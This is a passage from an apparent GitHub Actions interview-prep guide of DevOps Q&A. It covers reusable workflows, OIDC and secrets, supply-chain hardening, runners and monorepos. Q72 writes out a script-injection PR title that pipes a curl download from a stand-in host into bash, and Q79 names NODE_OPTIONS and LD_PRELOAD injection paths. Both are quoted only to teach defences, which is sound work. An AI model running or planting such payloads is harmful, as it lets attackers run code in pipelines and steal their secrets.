**Situation read →** API calls, text processing, cross-platform.

**What I'd do →**
1. JavaScript action (`runs.using: node24`) using `@actions/github` to find and update an existing bot comment (avoid spam).
2. Bundle with ncc, commit `dist/`, test with Jest and an integration workflow on both OSes.

**Why →** Docker actions do not run on Windows; composite with bash scripting gets fragile for API pagination and JSON.

**Interview tip →** "Update the existing comment instead of posting a new one each run" shows UX awareness.

</details>

### Q43. A reusable workflow needs to return the deployed URL to the caller. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Output mapping through two levels.

**What I'd do →**
1. Step output, then job output, then workflow output:
   ```yaml
   on:
     workflow_call:
       outputs:
         url:
           value: ${{ jobs.deploy.outputs.url }}
   jobs:
     deploy:
       outputs:
         url: ${{ steps.svc.outputs.url }}
   ```
2. Caller reads `needs.<calling-job>.outputs.url`.

**Why →** Each boundary needs an explicit mapping.

**Interview tip →** Mention the `jobs` context exists only for this purpose.

</details>

### Q44. Teams ask for a "golden pipeline" but still need custom test steps. How do you design for extension? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Balance standardization and flexibility.

**What I'd do →**
1. Split the golden pipeline into stages as separate reusable workflows (build, scan, deploy) rather than one monolith.
2. Teams own their test job in their repo and chain: `test` (theirs) then `uses: platform/build-image.yml` then `uses: platform/deploy-eks.yml`.
3. Offer inputs for common knobs (Dockerfile path, build args, test command), not arbitrary script injection points.
4. Enforce non-negotiables (scan, provenance) inside the platform workflows and via rulesets.

**Why →** Composable blocks beat one template with 40 inputs.

**Interview tip →** "Paved road, not a cage."

</details>

### Q45. Your JavaScript action's `dist/` in a PR does not match the source. How do you prevent shipping stale bundles? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Source and committed bundle drift.

**What I'd do →**
1. CI job: `npm ci && npm run build && git diff --exit-code dist/`.
2. Optionally regenerate `dist/` in a release workflow instead of by hand.
3. Review `dist/` diffs in PRs from outside contributors carefully; that is where malicious code hides.

**Why →** The runner executes `dist/`, not `src/`.

**Interview tip →** Mention the supply-chain angle of reviewing bundled code.

</details>

### Q46. You maintain a public action used by thousands of repos. How do you release safely? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You are now part of others' supply chain.

**What I'd do →**
1. Protected `main`, required reviews, 2FA, tag rulesets restricting who can create `v*` tags.
2. Release via workflow from `main` only, with immutable releases enabled.
3. Semver tags plus moving major tag; document SHA pinning in the README.
4. Minimal dependencies, Dependabot, CodeQL, and provenance attestation for `dist/`.
5. A security policy and private vulnerability reporting.

**Why →** The tj-actions compromise showed how one maintainer token can hit thousands of pipelines.

**Interview tip →** Reference a real incident; it signals current awareness.

</details>

### Q47. You need a step that runs a Python linter with exact dependencies in many repos. Docker action or composite? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dependency isolation vs speed and portability.

**What I'd do →**
1. If Linux only, publish a prebuilt image to GHCR and a Docker action referencing `docker://ghcr.io/org/pylint-action@sha256:...`.
2. If cross-platform or speed matters, composite with `setup-python` (with cache) and a pinned requirements file shipped in the action repo.

**Why →** A prebuilt image gives exact dependencies; a `Dockerfile`-based action rebuilds every run, which is slow.

**Interview tip →** Call out "prebuilt image, not Dockerfile" for Docker actions.

</details>

### Q48. Consumers of your reusable workflow need different runners (hosted for most, ARC for one team). How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `runs-on` must be configurable.

**What I'd do →**
1. Input `runner` with default:
   ```yaml
   inputs:
     runner: { type: string, default: ubuntu-24.04 }
   jobs:
     build:
       runs-on: ${{ inputs.runner }}
   ```
2. For label arrays, accept a JSON string and use `fromJSON(inputs.runner)`.

**Why →** `runs-on` supports `inputs` context in reusable workflows.

**Interview tip →** Mention the JSON trick for multiple labels.

</details>

### Q49. A reusable workflow uses `concurrency: ${{ github.workflow }}` and two different callers cancel each other unexpectedly, or never serialize. Explain and fix. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** `github.workflow` resolves to the caller's name, so groups differ per caller (no serialization across callers) or collide if callers share names.

**What I'd do →**
1. Define the group from explicit inputs: `group: deploy-${{ inputs.environment }}-${{ inputs.service }}`.
2. Put it at job level in the reusable workflow with `cancel-in-progress: false`.

**Why →** Deterministic group keys based on what is being protected (environment and service) are the only safe choice.

**Interview tip →** "Concurrency keys should describe the resource, not the workflow."

</details>

### Q50. You want all repos to get a new security scan without editing 300 repos. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Org-wide enforcement.

**What I'd do →**
1. Put the scan workflow in a central repo.
2. Create an org ruleset with "Require workflows to pass before merging", targeting repos by custom property (`tier: production`).
3. Roll out in evaluate mode first, then active.

**Why →** Rulesets inject the workflow into PRs of targeted repos with no per-repo YAML.

**Interview tip →** Mention evaluate mode; big-bang enforcement creates angry teams.

</details>

### Q51. A composite action needs to run a script file that lives inside the action repo. How do you reference it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The working directory is the consumer's workspace, not the action's.

**What I'd do →**
1. Use `github.action_path`:
   ```yaml
   - run: ${{ github.action_path }}/scripts/check.sh
     shell: bash
   ```
2. Or add it to PATH: `echo "${{ github.action_path }}/scripts" >> "$GITHUB_PATH"`.

**Why →** Relative paths resolve against the consumer's repo and fail with "No such file".

**Interview tip →** `GITHUB_ACTION_PATH` is the env var equivalent.

</details>

### Q52. How would you migrate from Jenkins shared libraries to GitHub Actions reuse? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Map concepts, not code line by line.

**What I'd do →**
1. Inventory library functions and group them: whole-pipeline templates become reusable workflows, step helpers become composite actions, logic-heavy helpers (API calls, reporting) become JavaScript actions.
2. Replace credentials with OIDC and environments, `input` approvals with environment reviewers, agents with hosted or ARC runners.
3. Migrate a pilot service, run both systems in parallel for two weeks, compare durations and failures.
4. Use GitHub Actions Importer to bootstrap conversions, then clean up.

**Why →** A structured mapping avoids reproducing Jenkins anti-patterns in YAML.

**Interview tip →** Mention running both in parallel; it shows migration discipline.

</details>

## Secrets, OIDC & Environments

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q53. You find AWS access keys stored as repo secrets in 25 repos. Plan the migration. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Long-lived keys, unknown blast radius.

**What I'd do →**
1. Create the GitHub OIDC provider in each AWS account (Terraform).
2. Per repo and environment, create roles with trust pinned to `repo:ORG/REPO:environment:ENV` and least-privilege policies.
3. Replace `aws-access-key-id` inputs with `role-to-assume`, add `id-token: write`.
4. After a green deploy, deactivate then delete the IAM user keys; check CloudTrail for any remaining usage first.
5. Add an SCP or IAM policy alarm for new access keys on CI users.

**Why →** OIDC removes rotation burden and leaked-key risk; credentials live about an hour.

**Interview tip →** Mention checking CloudTrail before deleting keys; something always still uses them.

</details>

### Q54. A developer asks to print a secret in the log "just once" to debug. What do you do instead? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Debugging a credential problem without exposure.

**What I'd do →**
1. Check presence and shape without the value: `test -n "$TOKEN" && echo "len=${#TOKEN}"`, or compare a hash prefix: `echo -n "$TOKEN" | sha256sum | cut -c1-8`.
2. Test the credential against the API and print only the status code.
3. If the value is wrong, rotate it and re-set with `gh secret set`.

**Why →** Logs are readable by everyone with repo read access and are retained for 90 days.

**Interview tip →** "Verify shape and behaviour, never the value."

</details>

### Q55. Staging and prod need different database URLs and different AWS roles, using one workflow. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment-scoped config.

**What I'd do →**
1. Create environments `staging` and `prod`.
2. Same names in each: secret `DATABASE_URL`, variable `DEPLOY_ROLE_ARN`.
3. Job: `environment: ${{ inputs.environment }}` and reference `secrets.DATABASE_URL`, `vars.DEPLOY_ROLE_ARN`.

**Why →** Identical names keep the workflow generic; GitHub resolves values per environment.

**Interview tip →** Mention that prod secrets are only released after approval.

</details>

### Q56. Security requires two people for prod deploys: the author cannot approve. Configure it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separation of duties.

**What I'd do →**
1. Prod environment: required reviewers = team `release-approvers`, enable "Prevent self-review", disable admin bypass.
2. Deployment branches: `main` and tag pattern `v*` only.
3. Branch protection on `main` with required PR reviews so the code itself had a second reviewer.

**Why →** Prevent self-review blocks the person who triggered the run from approving it.

**Interview tip →** Mention audit trail: approvals are recorded on the deployment and in the audit log.

</details>

### Q57. Write the AWS trust policy for a role used only by the prod deploy job of one repo. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pin issuer, audience and subject.

**What I'd do →**
1. Trust policy:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Allow",
       "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
       "Action": "sts:AssumeRoleWithWebIdentity",
       "Condition": {
         "StringEquals": {
           "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
           "token.actions.githubusercontent.com:sub": "repo:devopsshack/shack-api:environment:prod"
         }
       }
     }]
   }
   ```
2. Attach a policy allowing only what the deploy needs (for example `eks:DescribeCluster`).

**Why →** Only jobs bound to the `prod` environment, which require approval, can assume it.

**Interview tip →** Explain that environment protection plus `sub` pinning chains GitHub approvals to AWS access.

</details>

### Q58. PR workflows need read-only AWS access for `terraform plan`, including from same-repo branches. How do you set trust? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate low-privilege role for PRs.

**What I'd do →**
1. Role `tf-plan-readonly` with `ReadOnlyAccess` plus state bucket read and lock table access.
2. Trust `sub` = `repo:devopsshack/infra:pull_request`.
3. Fork PRs do not get the OIDC token with secrets context in a usable way; keep plans for forks disabled or manual.

**Why →** PR code is less trusted, so its identity gets read-only permissions, while apply uses a different environment-pinned role.

**Interview tip →** Two roles, two trust subjects: one for PRs, one for the gated apply.

</details>

### Q59. A team stores a 200 KB kubeconfig and certificates as secrets and hits the size limit. What do you recommend? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** 48 KB secret limit, and static cluster credentials are a smell.

**What I'd do →**
1. For EKS: OIDC to AWS and `aws eks update-kubeconfig`; for AKS and GKE: the equivalent OIDC login and get-credentials.
2. For unavoidable files, store them in a secret manager and fetch at runtime, or encrypt the file in repo with `gpg --symmetric` and keep only the passphrase as a secret.

**Why →** Dynamic credentials remove both the size problem and the rotation problem.

**Interview tip →** Mention the 48 KB limit and the encrypted-file workaround from GitHub docs.

</details>

### Q60. You need Vault secrets in workflows without a static Vault token. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Vault supports JWT/OIDC auth with GitHub's issuer.

**What I'd do →**
1. Vault: `vault auth enable jwt`, configure `oidc_discovery_url=https://token.actions.githubusercontent.com`, `bound_issuer` the same.
2. Role with `bound_claims` on `repository` and `environment`, `user_claim=actor`, short TTL, and a policy for `secret/data/shack-api/prod/*`.
3. Workflow:
   ```yaml
   - uses: hashicorp/vault-action@v3
     with:
       url: https://vault.example.com
       method: jwt
       role: shack-api-prod
       secrets: secret/data/shack-api/prod db_password | DB_PASSWORD
   ```

**Why →** Same keyless model as cloud OIDC; Vault becomes the single source of truth.

**Interview tip →** Mention binding claims to environment so only approved jobs get prod secrets.

</details>

### Q61. Dependabot PRs fail because secrets are empty. Why, and what do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dependabot-triggered runs use Dependabot secrets, not Actions secrets, and get a read-only token.

**What I'd do →**
1. Add needed secrets under Settings, Secrets, Dependabot (for example a private registry token).
2. Skip steps that need write or deploy access when `github.actor == 'dependabot[bot]'`.
3. For auto-merge, use a separate `pull_request_target` workflow that only calls the API (no code checkout) with `dependabot/fetch-metadata`.

**Why →** Dependabot PR code is treated as untrusted, like fork code.

**Interview tip →** Know that Dependabot has its own secret store.

</details>

### Q62. A prod deploy waits for approval, but on-call is asleep and the fix is urgent. Design break-glass. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need speed without silently bypassing controls.

**What I'd do →**
1. Separate environment `prod-emergency` with a small senior approver group and its own AWS role, deploy branches `hotfix/*` and `main`.
2. `workflow_dispatch` with `reason` input written to the summary and posted to an incident channel.
3. Alert security on every use (audit log streaming rule).
4. Post-incident review of every emergency deploy.

**Why →** A documented, audited fast path beats admins bypassing protection rules.

**Interview tip →** Emphasize auditability over speed alone.

</details>

### Q63. You want approvals only for prod but automatic deploys to dev and staging, with staging delayed 10 minutes for smoke checks. Configure. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment rules per stage.

**What I'd do →**
1. `dev`: no rules, deployment branch `main`.
2. `staging`: wait timer 10 minutes, deployment branch `main`.
3. `prod`: required reviewers, prevent self-review, branches `main` and tags `v*`.
4. Chain with `needs: deploy-dev` then `needs: deploy-staging`.

**Why →** Rules live in environments, so the workflow stays simple.

**Interview tip →** Wait timers do not consume runner minutes.

</details>

### Q64. An org secret must be available only to three repos. How? And how do you audit who used it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Scoped org secret.

**What I'd do →**
1. `gh secret set NEXUS_TOKEN --org devopsshack --visibility selected --repos svc-a,svc-b,svc-c`.
2. Audit: org audit log events for secret changes; for usage, the credential's own server logs (Nexus access log) since GitHub does not log secret reads per run.

**Why →** Least distribution; usage auditing must happen at the target system.

**Interview tip →** Admit the limitation: GitHub records secret management, not per-run usage.

</details>

### Q65. You need to push to GHCR and to a second repo's branch from one workflow. Which tokens? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One same-repo action, one cross-repo action.

**What I'd do →**
1. GHCR push: `GITHUB_TOKEN` with `packages: write` (package linked to the repo).
2. Cross-repo push: GitHub App token from `actions/create-github-app-token` scoped to the target repo with `contents: write`.
3. Pass the app token only to the step that pushes.

**Why →** `GITHUB_TOKEN` cannot write to other repos; App tokens are short-lived and scoped.

**Interview tip →** Avoid PATs tied to a human account.

</details>

### Q66. You want to run deployment jobs from GitHub but the clusters are private with no public API endpoint. Options? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Hosted runners cannot reach private endpoints.

**What I'd do →**
1. ARC runners inside the VPC (or a dedicated small EKS cluster with network access), restricted via runner group to the deploy repos and workflows.
2. Or hosted larger runners with Azure private networking (Azure) or static IPs allow-listed on a bastion or proxy.
3. Or switch to GitOps: Actions updates a manifest repo, Argo CD inside the cluster pulls.

**Why →** GitOps removes inbound access entirely; ARC in-VPC keeps push-based deploys.

**Interview tip →** Present GitOps as the cleanest answer for private clusters.

</details>

### Q67. Secrets were exposed in public workflow logs for 3 hours. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Incident response, assume compromise.

**What I'd do →**
1. Rotate every exposed credential immediately; revoke tokens at the provider.
2. Delete the affected run logs (`gh run delete` or API) to stop further exposure.
3. Search provider audit logs (CloudTrail, npm) for use during the window.
4. Find the cause: `set -x`, transformed secret, third-party action, and fix it.
5. Postmortem, add log scanning, and move to OIDC where possible.

**Why →** Deleting logs does not undo exposure; rotation is the only real fix.

**Interview tip →** Rotate first, investigate second.

</details>

### Q68. Each environment should deploy to a different AWS account. How do you structure roles and variables? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Multi-account with OIDC.

**What I'd do →**
1. OIDC provider in each account (dev, staging, prod), created by Terraform.
2. Role per account trusting `repo:ORG/REPO:environment:<env>`.
3. Environment variable `DEPLOY_ROLE_ARN` per environment, `AWS_REGION` as repo variable.
4. Same workflow, `role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}`.

**Why →** Account boundaries plus environment-pinned trust contain any compromise to one stage.

**Interview tip →** Mention that role ARNs are config (variables), not secrets.

</details>

### Q69. You need a job to read prod secrets for a read-only smoke test without creating deployment noise or approvals. Approach? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment use implies deployments and protection rules.

**What I'd do →**
1. Create a separate environment `prod-smoke` with only the read-only secret and its own narrow role.
2. Restrict its deployment branches to `main`.
3. No reviewers, because the credential is read-only by design.

**Why →** Splitting by privilege keeps approvals meaningful where writes happen.

**Interview tip →** "Approvals guard write paths; read paths get narrow credentials instead."

</details>

### Q70. An auditor asks you to prove that no one deployed to prod without approval last quarter. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Evidence from GitHub and the cloud.

**What I'd do →**
1. Export deployments for the prod environment via API (`/repos/{o}/{r}/deployments?environment=prod`) and their reviews (`/actions/runs/{id}/approvals`).
2. Export audit log events for environment rule changes and bypasses.
3. Correlate with CloudTrail `AssumeRoleWithWebIdentity` events for the prod role (session name contains run ID) to show every prod session matches an approved run.

**Why →** Two independent sources make the evidence credible.

**Interview tip →** Mention setting `role-session-name` with the run ID to make this correlation possible.

</details>

## Security Hardening & Supply Chain

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q71. You are asked to harden an existing repo's workflows in one week. What is your checklist? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Fast, high-impact controls first.

**What I'd do →**
1. Set default workflow permissions to read-only; add `permissions: contents: read` at the top of every workflow and per-job grants.
2. Pin all third-party actions to SHAs; add Dependabot for `github-actions`.
3. Run `zizmor` and `actionlint`; fix script injection and `pull_request_target` usage.
4. `persist-credentials: false` on checkout where pushing is not needed.
5. Move cloud keys to OIDC; environment protection on prod.
6. CODEOWNERS on `.github/`; restrict allowed actions at org level.
7. Fork PR approval required for outside contributors.

**Why →** These close the most exploited paths: token abuse, mutable dependencies, and injection.

**Interview tip →** Lead with "least-privilege token and SHA pinning", the two controls every reviewer expects.

</details>

### Q72. A contributor's PR title is `"; curl -s https://evil.sh | bash; echo "` and your labeler workflow uses the title in `run:`. What happens and how do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Script injection; if the workflow uses `pull_request_target`, it runs with secrets and a write token.

**What I'd do →**
1. Replace inline interpolation with env:
   ```yaml
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: |
       if [[ "$TITLE" == feat* ]]; then echo "feature"; fi
   ```
2. Audit all workflows for `${{ github.event.*` inside `run:` and `script:`.
3. Rotate any secrets the workflow had access to if it has run on such a PR.

**Why →** Expressions are pasted into script text before execution; env variables are expanded as data.

**Interview tip →** List the untrusted fields: titles, bodies, branch names, commit messages, labels.

</details>

### Q73. Your OSS project needs to run tests on fork PRs and post coverage comments. Design it safely. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Untrusted code must run without secrets; commenting needs write access.

**What I'd do →**
1. `ci.yml` on `pull_request`: run tests, write `coverage.json` and the PR number to an artifact. No secrets, read-only token.
2. `comment.yml` on `workflow_run` (CI completed): download the artifact with `run-id`, validate PR number is an integer and the JSON schema, render the comment, post with `pull-requests: write`.
3. Never execute anything from the artifact; never check out the PR head in `comment.yml`.

**Why →** Splits untrusted execution from privileged writing, with only data crossing the boundary.

**Interview tip →** Name it "the two-workflow pattern" and mention artifact validation.

</details>

### Q74. A popular action you use was compromised and its tags repointed. What do you do in the first hour? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Supply-chain incident; assume secrets in affected runs leaked.

**What I'd do →**
1. Find usage org-wide: code search `org:devopsshack "tj-actions/changed-files"` and list runs in the exposure window.
2. Block the action at org level (allowed actions policy) to stop new runs.
3. Rotate every secret available to affected workflows; check logs of public repos for dumped secrets and delete those runs.
4. Replace with a pinned safe SHA or an alternative.
5. Enforce SHA pinning org-wide afterwards.

**Why →** Blocking stops the bleed, rotation removes the impact, pinning prevents recurrence.

**Interview tip →** Speak in time order: contain, rotate, eradicate, prevent.

</details>

### Q75. You must prove that a container image in prod was built by your CI from a specific commit. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Build provenance and verification at deploy time.

**What I'd do →**
1. In the build job, `actions/attest-build-provenance` on the pushed digest (`id-token: write`, `attestations: write`).
2. Before deploy, `gh attestation verify oci://$IMAGE@$DIGEST --owner devopsshack --signer-workflow devopsshack/shack-api/.github/workflows/cd.yml`.
3. In-cluster, enforce with Kyverno `verifyImages` or Sigstore policy-controller requiring provenance from your workflow identity.

**Why →** Signed provenance ties the digest to repo, workflow, commit and run, and admission policy makes it mandatory.

**Interview tip →** Mention SLSA levels; this setup gives SLSA build level 2 to 3 characteristics on hosted runners.

</details>

### Q76. A developer wants to use a new Marketplace action with 40 stars for Slack notifications. How do you evaluate it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Third-party code would run with the job's token and secrets.

**What I'd do →**
1. Check: maintainer reputation, recent activity, open security issues, permissions it requests, network calls in code, dependencies.
2. Prefer a few lines of `curl` to the Slack webhook over a dependency for trivial tasks.
3. If adopted: pin SHA, isolate it in a job with `permissions: {}` and only the webhook secret.
4. Add it to the org allow-list after review.

**Why →** Each action is a dependency with full job access.

**Interview tip →** "If it's ten lines of curl, I write the ten lines."

</details>

### Q77. You find `pull_request_target` used to build and test PRs in a private repo. Is that acceptable? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private repos limit forks to people with read access, but insiders, compromised accounts and accidental malicious dependencies still exist.

**What I'd do →**
1. Switch to `pull_request`; in private repos, same-repo PRs already get secrets with `pull_request`.
2. If forks are used internally, enable "Send secrets to workflows from fork pull requests" only if truly needed, and with approval required.
3. Remove the head checkout from any remaining `pull_request_target` workflow.

**Why →** `pull_request_target` gives no benefit here and keeps a dangerous pattern alive.

**Interview tip →** The trigger is for metadata on public fork PRs, not for building code.

</details>

### Q78. How do you stop workflows from pushing directly to `main` while still letting a release bot update the changelog? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Branch protection vs automation.

**What I'd do →**
1. Ruleset on `main`: require PRs and status checks, block force pushes.
2. Release bot (GitHub App) opens a PR with the changelog (release-please model) rather than pushing.
3. If direct push is essential, add only the App to the ruleset bypass list, never `GITHUB_TOKEN` broadly.

**Why →** Rulesets support specific app bypass, keeping humans and normal workflows under protection.

**Interview tip →** Prefer "bot opens PR" over bypasses.

</details>

### Q79. A workflow writes untrusted data to `$GITHUB_ENV`. Why is that dangerous and how do you fix it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Newlines in the data let an attacker define arbitrary env vars for later steps, such as `NODE_OPTIONS=--require /tmp/x.js` or `LD_PRELOAD`.

**What I'd do →**
1. Avoid writing untrusted values to `$GITHUB_ENV`; pass them as step outputs and map into `env:` of the consuming step.
2. If unavoidable, use a random heredoc delimiter and validate content (reject newlines).

**Why →** `GITHUB_ENV` affects every later step including third-party actions.

**Interview tip →** Mention `NODE_OPTIONS` as the concrete exploitation path.

</details>

### Q80. You want every PR that edits `.github/workflows/` to get security review automatically. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ownership and automated checks.

**What I'd do →**
1. CODEOWNERS: `/.github/ @devopsshack/platform-security`, plus "require review from Code Owners".
2. A workflow running `zizmor` and `actionlint` on `paths: ['.github/**']` that uploads SARIF to code scanning.

**Why →** Human review plus automated linting catches both design and pattern mistakes.

**Interview tip →** Workflow files are code with production credentials; treat them as such.

</details>

### Q81. Runners on GitHub-hosted VMs can reach the internet freely. How do you detect or limit exfiltration? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Egress control on hosted runners is limited.

**What I'd do →**
1. Use an egress-monitoring agent such as StepSecurity Harden-Runner in audit mode to baseline endpoints, then block mode with an allow-list.
2. For sensitive workflows, use larger runners with private networking or self-hosted runners behind an egress proxy.
3. Keep secrets scoped to steps so exfiltration from other steps finds nothing.

**Why →** The tj-actions incident was detected by egress monitoring of unexpected endpoints.

**Interview tip →** Mention audit first, then block, to avoid breaking builds.

</details>

### Q82. Your release workflow restores caches built by PR workflows. What is the risk and fix? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cache poisoning: a privileged release consumes data created in a less trusted context.

**What I'd do →**
1. Release builds run clean: no `actions/cache` restore, `setup-node` without `cache`, Docker build with `--no-cache` or registry cache written only from `main`.
2. Ensure no `pull_request_target` workflow saves caches.

**Why →** Releases are where integrity matters most; speed matters least.

**Interview tip →** "Release builds are hermetic and cacheless."

</details>

### Q83. Management wants all actions to come only from GitHub, verified creators, and an internal list. How do you implement it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Org policy.

**What I'd do →**
1. Org Settings, Actions, Policies: "Allow devopsshack, and select non-devopsshack, actions and reusable workflows", tick "Allow actions created by GitHub" and "Allow Marketplace actions by verified creators", add patterns like `aquasecurity/trivy-action@*`.
2. Enable "Require actions to be pinned to a full-length commit SHA" where available.
3. Document the request process for adding new actions.

**Why →** Explicit allow-listing turns the supply chain into a reviewed inventory.

**Interview tip →** Mention a request process; otherwise teams copy action code into repos to bypass.

</details>

### Q84. A job needs to push a commit back to the PR branch (auto-format). Do it safely. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Write access to branches, fork limitations, loop risk.

**What I'd do →**
1. Only for same-repo PRs: `if: github.event.pull_request.head.repo.full_name == github.repository`.
2. `permissions: contents: write`, checkout `ref: ${{ github.head_ref }}`.
3. Commit as `github-actions[bot]` and push; the push by `GITHUB_TOKEN` will not retrigger CI (no loop), so run checks on the formatted code in the same job or require a new push.

**Why →** Fork branches cannot be written with `GITHUB_TOKEN`, and pushing back with a PAT would trigger loops.

**Interview tip →** Many teams prefer failing the check with a diff over pushing commits.

</details>

### Q85. You want to detect secrets accidentally committed in PRs within CI. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secret scanning at PR time.

**What I'd do →**
1. Enable GitHub secret scanning with push protection (blocks pushes containing known token formats).
2. Add `gitleaks` in CI for custom patterns:
   ```yaml
   - uses: actions/checkout@v4
     with: { fetch-depth: 0 }
   - run: docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:v8.21.2 detect --source /repo --log-opts "origin/main..HEAD"
   ```

**Why →** Push protection prevents the leak; CI scanning catches custom formats.

**Interview tip →** Remember that a committed secret must be rotated even if the commit is removed.

</details>

### Q86. A third-party action requires `contents: write` but you only want it to read. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Over-privileged dependency.

**What I'd do →**
1. Read its code to understand why; often a feature you do not use (auto-commit).
2. Run it in a separate job with `permissions: contents: read` and see if it works with its write feature disabled.
3. If it truly needs write for a read use case, replace it.

**Why →** Granting write to a third-party action lets it modify your code or releases.

**Interview tip →** "Permissions are per job, so isolate risky actions in their own job."

</details>

## Runners, ARC, Monorepos & Releases

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q87. You must build on runners that can reach an internal Artifactory. Design the runner setup. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private network access, needs isolation and scaling.

**What I'd do →**
1. ARC on an EKS cluster in the VPC, scale set `arc-internal` with `minRunners: 1`, `maxRunners: 30`.
2. Runner group `internal-network` limited to selected repos.
3. Custom runner image with corporate CA and tools baked in.
4. Ephemeral pods, no node IAM role access (IMDS hop limit 1), OIDC for cloud access.

**Why →** Ephemeral pods in a controlled network give access without persistent risk.

**Interview tip →** Mention runner groups as the access control layer.

</details>

### Q88. Persistent self-hosted runners keep failing because a previous job left files and Docker images. Fix the root cause. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** State leaking between jobs.

**What I'd do →**
1. Move to ephemeral runners (`--ephemeral` with autoscaling, or ARC).
2. In the meantime, a job-completed hook (`ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/opt/cleanup.sh`) that wipes the workspace, prunes Docker and removes temp credentials.

**Why →** Cleanup scripts are a patch; ephemeral runners remove the class of problem.

**Interview tip →** Know the runner job-started and job-completed hooks.

</details>

### Q89. Design ARC for a company with Linux build jobs, Docker image builds, and GPU tests. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Different workloads need different scale sets.

**What I'd do →**
1. One controller, three scale sets: `arc-linux` (default mode, small CPU), `arc-docker` (dind mode on a tainted node pool), `arc-gpu` (nodeSelector for GPU nodes, `minRunners: 0`).
2. Each in its own namespace with ResourceQuotas and requests and limits in the pod template.
3. Karpenter NodePools per class, spot for linux and docker, on-demand for GPU.
4. Runner groups restrict GPU to ML repos.
5. Pin chart versions, monitor listener metrics (`listenerMetrics`) with Prometheus.

**Why →** Separate scale sets isolate privilege (dind) and cost (GPU) and scale independently.

**Interview tip →** Mention that `runs-on` equals the scale set name.

</details>

### Q90. You need to upgrade ARC across 10 clusters with zero dropped jobs. Plan it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Controller and scale sets must match versions; CRDs change.

**What I'd do →**
1. Read release notes for CRD changes.
2. In a staging cluster: uninstall scale sets (running jobs finish first since ephemeral runners drain), upgrade the controller with new CRDs, reinstall scale sets with the same names.
3. Roll cluster by cluster during low traffic; with two clusters serving the same scale set name via different runner groups, shift load first.
4. Validate with a canary workflow that targets each scale set.

**Why →** Version skew between controller and scale set is a common source of listener failures.

**Interview tip →** Mention pinning `--version` for both charts.

</details>

### Q91. A monorepo has 30 services; every PR builds all of them. Redesign. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need change detection with dependency awareness.

**What I'd do →**
1. `changes` job computes affected services: path filters per service including shared libs, or `nx show projects --affected --base=origin/main --json`.
2. Dynamic matrix build with `fromJSON`, guarded against empty lists.
3. Per-service Docker cache scope.
4. Fan-in `ci-ok` as the only required check.
